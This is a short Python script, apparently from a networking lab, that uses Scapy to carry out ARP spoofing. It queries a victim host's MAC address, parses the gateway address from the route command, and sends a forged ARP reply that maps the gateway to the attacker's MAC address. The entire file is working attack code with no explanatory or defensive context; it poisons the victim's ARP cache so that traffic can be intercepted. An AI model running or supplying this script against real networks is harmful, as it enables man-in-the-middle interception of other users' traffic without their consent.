from scapy.all import *
import subprocess

A_IP="192.168.32.59"
V_IP="192.168.32.218"
A_MAC="00:0c:29:1b:6f:10"

GW_ALL= subprocess.check_output(["route"])
split_GW=GW_ALL.split()
GW=split_GW[13]

pkt =sr1(ARP(op=ARP.who_has,psrc =A_IP, pdst=V_IP))
answer= pkt.summary()
split_answer= answer.split()
V_MAC= split_answer[3]

arp_reply = ARP(op=ARP.is_at, psrc=GW, pdst="192.168.32.218", hwsrc = A_MAC, hwdst = V_MAC)
arp_reply.show()
send(arp_reply)
